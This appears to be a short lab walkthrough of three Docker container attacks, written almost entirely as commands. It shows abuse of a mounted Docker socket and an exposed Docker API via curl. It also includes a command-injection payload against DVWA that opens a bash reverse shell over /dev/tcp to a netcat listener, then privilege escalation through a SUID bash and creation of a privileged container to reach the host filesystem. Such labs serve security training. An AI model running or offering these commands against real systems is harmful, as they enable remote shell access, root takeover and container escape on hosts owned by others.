# Leaking the Container

## Attack 1 - DOS
```
docker run --rm -it ubuntu bash
apt-get update
apt-get install iputils-ping
```


## Attack 2 - Docker socket
```
# starts the first container
docker run -it -d alpine

# starts the 2nd container and install docker
docker run -it --rm -v /var/run/docker.sock:/var/run/docker.sock alpine sh
apk update
apk add docker
docker --version
docker ps
docker kill <cont_id>

```

```
docker run -it --rm alpine sh
apk update
apk add curl

# create and start container

curl --header "Content-Type: application/json" --request POST --data '{"Image": "alpine", "Cmd": ["sleep", "600"]}' http://10.0.2.15:2376/containers/create
curl -X POST http:/10.0.2.15:2376/containers/<id>/start


```


## Attack 3 -- combo
```
cd docker-vulnerable-dvwa/
docker build -t dvwa-suid:1.0 . # around 5min

docker run --rm -it -p 80:80 -d dvwa-suid:1.0

# terminal for reverse shell
nc -lvp 4567

# browser, localhost:80. admin/password, reset db

# left-sidebar "Command Injection". Try ping Google 172.217.17.132
127.0.0.1; ls -la # see, can inject command
# Next, start reverse shell
127.0.0.1 & bash -c 'bash -i >& /dev/tcp/10.0.2.15/4567 0>&1'

# At reverse shell terminal
www-data@a9a295f285de:/var/www/html/vulnerabilities/exec$ /bin/bashroot -p
/bin/bashroot -p # won't work without -p
whoami
root # pwned!
curl http://10.0.2.15:2376/containers/json # check container list
# Start an easy to hack privileged container
curl --header "Content-Type: application/json" --request POST --data '{"Image": "alpine", "Cmd": ["sleep", "600"], "Privileged": true}' http://10.0.2.15:2376/containers/create
curl -X POST -H "Content-Type: application/json" http:/10.0.2.15:2376/containers/6e5d5db956d09a/start

# Attack the privileged container, mount host fs, change passwd and what not...


```
